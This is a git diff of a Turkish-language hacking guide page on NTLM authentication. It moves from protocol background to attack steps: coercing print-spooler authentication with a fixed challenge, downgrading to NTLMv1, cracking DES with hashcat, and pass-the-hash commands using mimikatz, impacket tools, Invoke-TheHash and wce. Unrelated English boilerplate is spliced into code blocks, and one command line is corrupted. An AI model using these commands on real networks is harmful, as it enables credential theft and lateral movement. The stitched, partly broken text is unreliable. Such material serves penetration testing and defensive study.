@@ -2,31 +2,31 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
+<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
+* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks deposuna** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
+* **Hacking püf noktalarınızı göndererek PR'lerle katkıda bulunun** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Temel Bilgiler
 
-**Windows XP ve Server 2003**'ün kullanıldığı ortamlarda, LM (Lan Yöneticisi) hash'leri kullanılır, ancak bunların kolayca ele geçirilebileceği genel olarak kabul edilir. Belirli bir LM hash'i, `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir senaryoyu temsil eder, boş bir dize için hash'i gösterir.
+**Windows XP ve Server 2003** gibi işletim sistemlerinin kullanıldığı ortamlarda, LM (Lan Yöneticisi) hash'leri kullanılır, ancak bunların kolayca ele geçirilebileceği genel olarak kabul edilir. Belirli bir LM hash'i, `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir senaryoyu temsil eder, boş bir dize için hash'i gösterir.
 
-Varsayılan olarak, **Kerberos** kimlik doğrulama protokolü kullanılan başlıca yöntemdir. NTLM (NT LAN Yöneticisi), belirli durumlarda devreye girer: Etkin Dizin yokluğu, alanın mevcut olmaması, Kerberos'un yanlış yapılandırma nedeniyle çalışmaması veya bağlantılar geçerli bir ana bilgisayar adı yerine bir IP adresi kullanılarak denendiğinde.
+Varsayılan olarak, **Kerberos** kimlik doğrulama protokolü kullanılan başlıca yöntemdir. NTLM (NT LAN Yöneticisi), belirli durumlarda devreye girer: Etkin Dizin yokluğu, etki alanının olmaması, Kerberos'un yanlış yapılandırma nedeniyle çalışmaması veya geçerli bir ana bilgisayar adı yerine bir IP adresi kullanılarak bağlantılar denendiğinde.
 
 Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, bir NTLM kimlik doğrulama sürecini işaret eder.
 
-Kimlik doğrulama protokolleri - LM, NTLMv1 ve NTLMv2 - belirli bir DLL tarafından desteklenir ve bu DLL `%windir%\Windows\System32\msv1\_0.dll` konumundadır.
+Kimlik doğrulama protokolleri - LM, NTLMv1 ve NTLMv2 - belirli bir DLL tarafından desteklenir ve bu DLL, `%windir%\Windows\System32\msv1\_0.dll` konumundadır.
 
 **Ana Noktalar**:
 
 * LM hash'leri zayıftır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`), kullanılmadığını gösterir.
-* Kerberos varsayılan kimlik doğrulama yöntemidir, NTLM yalnızca belirli koşullar altında kullanılır.
-* NTLM kimlik doğrulama paketleri, "NTLMSSP" başlığıyla tanımlanabilir.
+* Kerberos, varsayılan kimlik doğrulama yöntemidir, NTLM yalnızca belirli koşullar altında kullanılır.
+* NTLM kimlik doğrulama paketleri, "NTLMSSP" başlığı ile tanımlanabilir.
 * Sistem dosyası `msv1\_0.dll`, LM, NTLMv1 ve NTLMv2 protokollerini destekler.
 
 ## LM, NTLMv1 ve NTLMv2
@@ -35,7 +35,7 @@ Hangi protokolün kullanılacağını kontrol edebilir ve yapılandırabilirsini
 
 ### GUI
 
-_secpol.msc_ dosyasını çalıştırın -> Yerel politikalar -> Güvenlik Seçenekleri -> Ağ Güvenliği: LAN Yöneticisi kimlik doğrulama seviyesi. 6 seviye bulunmaktadır (0'dan 5'e).
+_secpol.msc_ dosyasını çalıştırın -> Yerel politikalar -> Güvenlik Seçenekleri -> Ağ Güvenliği: LAN Yöneticisi kimlik doğrulama seviyesi. 6 seviye bulunmaktadır (0'dan 5'e kadar).
 
 ![](<../../.gitbook/assets/image (919).png>)
 
@@ -57,17 +57,17 @@ Mümkün değerler:
 ## Temel NTLM Alan kimlik doğrulama Şeması
 
 1. **Kullanıcı**, **kimlik bilgilerini** girer
-2. İstemci makine, **alan adını** ve **kullanıcı adını** göndererek bir kimlik doğrulama isteği **gönderir**
+2. İstemci makine, **alan adı** ve **kullanıcı adını** göndererek bir kimlik doğrulama isteği **gönderir**
 3. **Sunucu**, **zorluk** gönderir
 4. **İstemci**, şifrenin hash'ini anahtar olarak kullanarak **zorluğu şifreler** ve yanıt olarak gönderir
-5. **Sunucu**, **alan adını, kullanıcı adını, zorluğu ve yanıtı** içeren bilgileri **Alan Denetleyicisine** gönderir. Eğer yapılandırılmış bir Etkin Dizin yoksa veya alan adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
-6. **Alan Denetleyicisi**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri sunucuya gönderir
+5. **Sunucu**, **alan adını, kullanıcı adını, zorluğu ve yanıtı** alan denetleyicisine gönderir. Eğer yapılandırılmış bir Etkin Dizin yoksa veya alan adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
+6. **Alan denetleyicisi**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri sunucuya gönderir
 
 **Sunucu** ve **Alan Denetleyicisi**, **NTDS.DIT** db içinde sunucunun şifresini bildiği için **Netlogon** sunucusu aracılığıyla bir **Güvenli Kanal** oluşturabilir.
 
 ### Yerel NTLM Kimlik Doğrulama Şeması
 
-Kimlik doğrulama, **öncekiyle aynıdır ancak** **sunucu**, kimlik doğrulamaya çalışan kullanıcının **hash'ini bilir**. Bu nedenle, Alan Denetleyicisine sormak yerine, **sunucu kendisi kontrol eder** kullanıcının kimlik doğrulayıp doğrulayamayacağını.
+Kimlik doğrulama, **öncekiyle aynıdır ancak** sunucu, kimlik doğrulamaya çalışan kullanıcının hash'ini **SAM** dosyası içinde bilir. Bu nedenle, Alan Denetleyicisine sormak yerine, **sunucu kendisi kontrol eder** kullanıcının kimlik doğrulayıp doğrulayamayacağını.
 
 ### NTLMv1 Zorluk
 
@@ -78,42 +78,30 @@ Kimlik doğrulama, **öncekiyle aynıdır ancak** **sunucu**, kimlik doğrulamay
 **Sorunlar**:
 
 * **Rastgelelik eksikliği**
-* 3 parça ayrı ayrı **saldırıya uğrayabilir** ve NT hash'i bulunabilir
+* 3 parça, NT hash'ı bulmak için **ayrı ayrı saldırıya uğrayabilir**
 * **DES çözülebilir**
 * 3. anahtar her zaman **5 sıfırdan** oluşur.
-* **Aynı zorluk** verildiğinde, **yanıtın** aynı olacaktır. Bu nedenle, kurbanı **1122334455667788** dizesiyle zorlamak ve yanıtı **önceden hesaplanmış gökkuşağı tabloları** kullanarak saldırmak mümkündür.
+* **Aynı zorluk** verildiğinde, **yanıtın** aynı olacaktır. Bu nedenle, kurbanı **"1122334455667788"** dizesiyle zorlamak ve yanıtı **önceden hesaplanmış gökkuşağı tablolarını kullanarak** saldırmak mümkündür.
 
 ### NTLMv1 saldırısı
 
-Günümüzde, Ayarlanmamış Delege yapılandırılmış ortamlar bulmak daha az yaygın hale gelmektedir, ancak bu, yapılandırılmış bir Yazıcı Kuyruğu hizmetini **kötüye kullanamayacağınız** anlamına gelmez.
+Günümüzde, Ayarlanmamış Delege yapılandırılmış ortamların daha az yaygın olduğu görülse de, bu, **yapılandırılmış bir Yazıcı Kuyruğu hizmetini kötüye kullanamayacağınız** anlamına gelmez.
 
-Zaten AD'de sahip olduğunuz bazı kimlik bilgilerini/oturumları kötüye kullanarak, Yazıcı Kuyruğunun, **kontrolünüz altındaki bir ana bilgisayara karşı kimlik doğrulamasını yapmasını** isteyebilirsiniz. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama zorluğunu 1122334455667788** olarak ayarlayabilir, kimlik doğrulama girişimini yakalayabilir ve eğer **NTLMv1** kullanılarak yapıldıysa **çözebilirsiniz**.\
+Zaten AD üzerinde sahip olduğunuz bazı kimlik bilgilerini/oturumları kullanarak, Yazıcı Kuyruğunun, **kontrolünüz altındaki bir ana bilgisayara karşı kimlik doğrulamasını yapmasını** isteyebilirsiniz. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama zorluğunu 1122334455667788** olarak ayarlayabilir, kimlik doğrulama girişimini yakalayabilir ve eğer **NTLMv1** kullanılarak yapıldıysa **çözebilirsiniz**.\
 Eğer `responder` kullanıyorsanız, **kimlik doğrulamasını düşürmek** için **`--lm` bayrağını kullanmayı** deneyebilirsiniz.\
 _Bu teknik için kimlik doğrulamanın NTLMv1 kullanılarak yapılması gerektiğini unutmayın (NTLMv2 geçerli değildir)._
 
-Unutmayın ki yazıcı, kimlik doğrulaması sırasında bilgisayar hesabını kullanacak ve bilgisayar hesapları **uzun ve rastgele şifreler** kullanır ki bunları genel **sözlüklerle** muhtemelen **çözemeyeceksiniz**. Ancak **NTLMv1** kimlik doğrulaması **DES kullanır** ([daha fazla bilgi için buraya bakın](./#ntlmv1-challenge)), bu nedenle DES'i çözmeye özel olarak adanmış bazı hizmetler kullanarak bunu çözebilirsiniz (örneğin [https://crack.sh/](https://crack.sh) kullanabilirsiniz).
+Unutmayın ki yazıcı, kimlik doğrulama sırasında bilgisayar hesabını kullanacak ve bilgisayar hesapları **uzun ve rastgele şifreler** kullanır ki bunları genel **sözlüklerle** kırmanız **muhtemelen mümkün olmayacaktır**. Ancak **NTLMv1** kimlik doğrulaması **DES kullanır** ([daha fazla bilgi için buraya bakın](./#ntlmv1-challenge)), bu nedenle DES'i kırmaya özel olarak tasarlanmış bazı hizmetleri kullanarak bunu kırabilirsiniz ([https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) gibi).
 
 ### hashcat ile NTLMv1 saldırısı
 
-NTLMv1 ayrıca NTLMv1 Çoklu Araç [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ile kırılabilir, bu araç NTLMv1 ile biçimlendirilmiş mesajları hashcat ile kırılabilir bir yöntemle oluşturur.
+NTLMv1 ayrıca NTLMv1 Çoklu Araç [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ile kırılabilir, bu araç NTLMv1 mesajlarını hashcat ile kırılabilir bir yönteme dönüştürür.
 
 Komut
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-## NTLM
-
-### NTLM Hash Dumping
-
-NTLM hash dumping is a common technique used by attackers to obtain password hashes from Windows systems. Attackers can then use these hashes in pass-the-hash attacks to move laterally within a network.
-
-#### Mimikatz
-
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a powerful tool that can be used to dump NTLM hashes from memory. Attackers with administrative privileges can use Mimikatz to extract password hashes from the LSASS process.
-
-#### Procdump
-
-[Procdump](https://docs.microsoft.com/sysinternals/downloads/procdump) is another tool that can be used to dump the memory of specific processes. Attackers can use Procdump to dump the LSASS process memory and then extract NTLM hashes using tools like Mimikatz.
+Aşağıdaki çıktıyı döndürecekti:
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -143,32 +131,32 @@ NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 
 ## Introduction
 
-NTLM hash dumping is a common technique used by attackers to obtain password hashes from Windows systems. These hashes can then be cracked offline to recover the original passwords, allowing attackers to gain unauthorized access to systems.
+NTLM hash dumping is a common technique used by hackers to extract password hashes from Windows systems. These hashes can then be cracked offline to recover the original passwords, allowing attackers to gain unauthorized access to the system.
 
-## How it Works
+## Steps to Dump NTLM Hashes
 
-1. **Dumping NTLM Hashes**: Attackers can dump NTLM hashes from Windows systems using various tools and techniques, such as Mimikatz or Windows Credential Editor (WCE).
+To dump NTLM hashes from a Windows system, hackers typically follow these steps:
 
-2. **Cracking the Hashes**: Once the hashes are obtained, attackers can use tools like Hashcat or John the Ripper to crack the hashes and recover the original passwords.
+1. **Dumping SAM Database**: The Security Accounts Manager (SAM) database stores password hashes on Windows systems. Hackers can dump this database using tools like `Mimikatz` or `pwdump`.
 
-3. **Pass-the-Hash Attacks**: Attackers can also use the cracked hashes in pass-the-hash attacks to authenticate to other systems using the stolen credentials.
+2. **Extracting Hashes**: Once the SAM database is dumped, hackers can extract the NTLM hashes from the database file.
 
-## Mitigation
+3. **Cracking Hashes**: The extracted NTLM hashes are then cracked using tools like `John the Ripper` or `Hashcat` to recover the original passwords.
 
-To mitigate the risk of NTLM hash dumping, organizations can implement the following security measures:
+## Mitigation Techniques
 
-- **Disable NTLM**: Disable the use of NTLM authentication in favor of more secure protocols like Kerberos.
+To protect against NTLM hash dumping, system administrators can implement the following mitigation techniques:
 
-- **Enforce Complex Passwords**: Require users to use complex and unique passwords to make it harder to crack the hashes.
+- **Use Strong Passwords**: Encourage users to use strong, complex passwords that are difficult to crack.
+- **Disable NTLM**: Disable NTLM authentication where possible and use more secure authentication protocols like Kerberos.
+- **Monitor for Suspicious Activity**: Regularly monitor systems for any suspicious activity that may indicate an ongoing hash dumping attack.
 
-- **Monitor for Suspicious Activity**: Monitor systems for any suspicious activity that may indicate an ongoing NTLM hash dumping attack.
-
-By following these mitigation strategies, organizations can reduce the risk of NTLM hash dumping and better protect their systems from unauthorized access.
+By following these mitigation techniques, organizations can reduce the risk of NTLM hash dumping attacks and enhance the security of their Windows systems.
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-Çalıştır hashcat'i (dağıtılmış olarak hashtopolis gibi bir araçla en iyisidir) aksi takdirde bunun için birkaç gün sürecektir.
+Çalıştır hashcat'ı (dağıtılmış olarak en iyi hashtopolis gibi bir araçla) aksi takdirde bunun için birkaç gün sürebilir.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
@@ -181,7 +169,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Şimdi, kırılan des anahtarlarını NTLM hash'in parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
+Şimdi, kırılan des anahtarlarını NTLM hash'in parçalarına dönüştürmek için hashcat-utilities'ini kullanmamız gerekiyor:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -195,25 +183,28 @@ Sonunda son kısım:
 
 586c # this is the last part
 ```
-## NTLM Reflection Attack
+## NTLM Relay Attack
 
-### Overview
+### Introduction
 
-NTLM reflection attack is a technique used to relay NTLM authentication traffic from a target server to a victim client, in order to obtain the victim's NTLM hash. This attack can be used in scenarios where the target server is vulnerable to NTLM relay attacks.
+NTLM relay attacks are a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to other machines to gain unauthorized access.
 
-### Usage
+### How it works
 
-1. Set up a rogue server to capture NTLM authentication traffic.
-2. Send a phishing email or perform another attack to make the victim's machine connect to the rogue server.
-3. Relay the NTLM authentication traffic from the target server to the victim's machine.
-4. Capture the victim's NTLM hash for further exploitation.
+1. The attacker intercepts NTLM authentication traffic between a client and a server.
+2. The attacker relays this traffic to another machine within the network.
+3. The target machine receives the relayed authentication request and responds with its own authentication.
+4. The attacker can then use the received authentication to access the target machine.
 
 ### Mitigation
 
-To prevent NTLM reflection attacks, it is recommended to:
-- Implement SMB signing to prevent relay attacks.
-- Use LDAP signing and channel binding.
-- Disable NTLM authentication in favor of more secure protocols like Kerberos.
+To mitigate NTLM relay attacks, consider implementing the following measures:
+
+- **Enforce SMB Signing:** Require SMB signing to prevent tampering with authentication traffic.
+- **Use Extended Protection for Authentication:** Enable Extended Protection for Authentication to protect against relay attacks.
+- **Disable NTLM:** Consider disabling NTLM authentication in favor of more secure protocols like Kerberos.
+
+By implementing these measures, you can significantly reduce the risk of NTLM relay attacks in your Windows environment.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -221,7 +212,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 **Zorluk uzunluğu 8 bayttır** ve **2 yanıt gönderilir**: Bir tanesi **24 bayt** uzunluğundadır ve **diğerinin** uzunluğu **değişkendir**.
 
-**İlk yanıt**, **istemci ve etki alanı** tarafından oluşturulan **diziyi** kullanarak **HMAC\_MD5** şifreleme yöntemiyle oluşturulur ve **anahtar** olarak **NT hash'in MD4**'ü kullanılır. Daha sonra, **sonuç**, **zorluk**'u şifrelemek için **anahtar** olarak kullanılacaktır. Buna, **8 baytlık bir istemci zorluğu eklenir**. Toplam: 24 B.
+**İlk yanıt**, **istemci ve etki alanı** tarafından oluşturulan **diziyi** **HMAC\_MD5** kullanarak şifreleyerek ve **anahtar olarak NT hash'in MD4**'ünü kullanarak oluşturulur. Daha sonra, **sonuç**, **zorluk**'ü şifrelemek için **anahtar** olarak kullanılacaktır. Buna, **8 baytlık bir istemci zorluğu eklenir**. Toplam: 24 B.
 
 **İkinci yanıt**, **birkaç değer** kullanılarak oluşturulur (yeni bir istemci zorlaması, **tekrar saldırılarını önlemek için bir zaman damgası**...).
 
@@ -230,9 +221,9 @@ Eğer **başarılı bir kimlik doğrulama işlemini yakalayan bir pcap**'iniz va
 ## Pass-the-Hash
 
 **Kurbanın hash'ine sahip olduktan sonra**, onu **taklit etmek** için kullanabilirsiniz.\
-Bu **hash**'ı kullanan **NTLM kimlik doğrulamasını gerçekleştirecek bir araç** kullanmanız gerekmektedir, **veya** yeni bir **oturum açma** oluşturabilir ve bu **hash**'i **LSASS** içine **enjekte** edebilirsiniz, böylece herhangi bir **NTLM kimlik doğrulaması gerçekleştirildiğinde**, bu **hash** kullanılacaktır. Son seçenek mimikatz'in yaptığı şeydir.
+Bu **hash'i kullanarak NTLM kimlik doğrulaması yapacak bir araç** kullanmanız gerekmektedir, **veya** yeni bir **oturum açma** oluşturabilir ve bu **hash'i LSASS içine enjekte edebilirsiniz**, böylece herhangi bir **NTLM kimlik doğrulaması yapıldığında**, bu **hash kullanılacaktır.** Son seçenek mimikatz'ın yaptığı şeydir.
 
-**Lütfen, Parola-the-Hash saldırılarını Bilgisayar hesapları kullanarak da gerçekleştirebileceğinizi unutmayın.**
+**Lütfen, Pass-the-Hash saldırılarını Bilgisayar hesaplarını kullanarak da gerçekleştirebileceğinizi unutmayın.**
 
 ### **Mimikatz**
 
@@ -240,9 +231,9 @@ Bu **hash**'ı kullanan **NTLM kimlik doğrulamasını gerçekleştirecek bir ar
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Bu, mimikatz başlatan kullanıcıların süreçlerini başlatacak ve LSASS içinde kaydedilen kimlik bilgileri, mimikatz parametrelerinin içindekiler olacaktır. Daha sonra, o kullanıcıymış gibi ağ kaynaklarına erişebilirsiniz (`runas /netonly` hilesine benzer ancak düz metin şifresini bilmenize gerek yok).
+Bu, mimikatz başlatan kullanıcıların süreçlerini başlatacak bir süreç başlatacaktır, ancak LSASS içinde kaydedilen kimlik bilgileri mimikatz parametrelerinin içindekilerdir. Daha sonra, o kullanıcıymış gibi ağ kaynaklarına erişebilirsiniz (`runas /netonly` hilesine benzer ancak düz metin şifresini bilmenize gerek yok).
 
-### Linux üzerinden Hash Taşıma
+### Linux üzerinden Pass-the-Hash
 
 Linux'ten Pass-the-Hash kullanarak Windows makinelerinde kod yürütme elde edebilirsiniz.\
 [**Buradan nasıl yapılacağını öğrenmek için tıklayın.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
@@ -254,7 +245,7 @@ Windows için [impacket ikili dosyalarını buradan](https://github.com/ropnop/i
 * **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 * **atexec.exe** (Bu durumda bir komut belirtmeniz gerekmektedir, cmd.exe ve powershell.exe etkileşimli bir kabuk elde etmek için geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* Daha fazla Impacket ikili dosyası bulunmaktadır...
+* Daha fazla Impacket ikili dosya bulunmaktadır...
 
 ### Invoke-TheHash
 
@@ -284,7 +275,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Bu işlev diğerlerinin **bir karışımıdır**. **Birkaç ana bilgisayar** geçebilir, **bazılarını hariç tutabilir** ve kullanmak istediğiniz **seçeneği seçebilirsiniz** (_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec** ve **WMIExec**'ten **herhangi birini seçerseniz** ancak _**Komut**_ parametresi vermezseniz, yalnızca **yeterli izinlere sahip olup olmadığınızı kontrol eder**.
+Bu işlev diğerlerinin **bir karışımıdır**. **Birkaç ana bilgisayar** geçebilir, **bazılarını hariç tutabilir** ve kullanmak istediğiniz **seçeneği seçebilirsiniz** (_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec** ve **WMIExec**'in **herhangi birini** seçerseniz ancak _**Komut**_ parametresi vermezseniz, yalnızca **yeterli izinlere** sahip olup olmadığınızı **kontrol eder**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -298,7 +289,7 @@ Bu araç mimikatz ile aynı işlemi yapacaktır (LSASS belleğini değiştirme).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-### Kullanıcı adı ve şifre ile manuel Windows uzaktan yürütme
+### Kullanıcı adı ve şifre ile Manuel Windows uzaktan yürütme
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
@@ -306,11 +297,11 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Bir Windows Ana Bilgisayarından Kimlik Bilgilerinin Çıkarılması
 
-**Daha fazla bilgi için** [**bir Windows ana bilgisayarından kimlik bilgilerini nasıl elde edebileceğiniz hakkında bu sayfayı okumalısınız**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
+**Daha fazla bilgi için** [**bir Windows ana bilgisayarından kimlik bilgilerini nasıl elde edeceğiniz hakkında bu sayfayı okumalısınız**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
 ## NTLM Aktarımı ve Yanıtlayıcı
 
-**Bu saldırıları nasıl gerçekleştireceğiniz hakkında daha detaylı kılavuzu okumak için:**
+**Bu saldırıları nasıl gerçekleştireceğiniz hakkında daha detaylı bir kılavuz için burayı okuyun:**
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
